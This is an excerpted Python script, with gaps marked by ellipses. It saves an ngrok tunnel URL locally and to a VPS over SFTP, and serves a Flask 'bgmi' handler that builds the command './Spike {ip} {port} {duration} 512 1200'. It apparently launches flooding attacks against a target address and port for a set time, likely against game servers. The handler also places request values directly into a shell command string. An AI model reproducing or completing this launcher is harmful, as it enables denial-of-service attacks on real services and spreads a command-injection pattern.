...
def update_soul_txt(public_url):
    with open("jon2.txt", "w") as file:
        file.write(public_url)
    print(f"New ngrok link saved in jon2.txt")
...
def update_vps_soul_txt(public_url):
    ...
    try:
        ...
        sftp = ssh.open_sftp()
        with sftp.open("jon2.txt", "w") as file:
            file.write(public_url)
        sftp.close()
        ssh.close()
        print("Updated jon2.txt on VPS successfully.")
    except Exception as e:
        print(f"Failed to update jon2.txt on VPS: {str(e)}")
...
def run_flask_app():
    ...
    def bgmi():
        ...
        command = f"./Spike {ip} {port} {duration} 512 1200"
